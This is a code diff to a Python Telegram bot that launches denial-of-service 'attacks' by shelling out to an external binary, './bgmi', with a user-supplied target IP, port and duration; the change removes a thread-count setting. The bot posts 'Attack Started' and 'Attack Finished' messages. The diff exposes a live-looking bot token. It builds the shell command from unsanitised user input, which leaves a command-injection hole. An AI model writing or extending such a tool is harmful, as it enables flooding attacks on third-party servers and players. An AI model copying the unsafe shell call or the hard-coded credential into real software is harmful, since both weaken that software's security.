@@ -21,7 +21,6 @@ TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'  # Replace
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
 ALLOWED_GROUP_ID = -1002295161013  # Replace with your allowed group ID
 max_duration = 150  # Default max attack duration
-DEFAULT_THREADS = 1000  # Default threads value for attacks
 
 # File to store key data
 KEY_FILE = "keys.txt"
@@ -300,14 +299,13 @@ async def attack_input(update: Update, context: CallbackContext):
         f"⚔️ *Attack Started!*\n"
         f"🎯 *Target*: {ip}:{port}\n"
         f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
         f"🔥 *Let the battlefield ignite! 💥*",
         parse_mode='Markdown'
     )
 
-    # Execute the external binary asynchronously with 4 arguments
+    # Execute the external binary asynchronously
     process = await asyncio.create_subprocess_shell(
-        f"./bgmi {ip} {port} {duration} {DEFAULT_THREADS}",
+        f"./bgmi {ip} {port} {duration}",
         stdout=asyncio.subprocess.PIPE,
         stderr=asyncio.subprocess.PIPE
     )
@@ -328,7 +326,6 @@ async def handle_attack_process(process, update: Update, ip: str, port: str, dur
             f"✅ *Attack Finished!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
             f"🔥 *The battlefield is now silent.*",
             parse_mode='Markdown'
         )
@@ -337,7 +334,6 @@ async def handle_attack_process(process, update: Update, ip: str, port: str, dur
             f"❌ *Attack Failed!*\n"
             f"🎯 *Target*: {ip}:{port}\n"
             f"🕒 *Duration*: {duration} sec\n"
-            f"🧵 *Threads*: {DEFAULT_THREADS} (default)\n"
             f"💥 *Error*: {stderr.decode().strip()}",
             parse_mode='Markdown'
         )
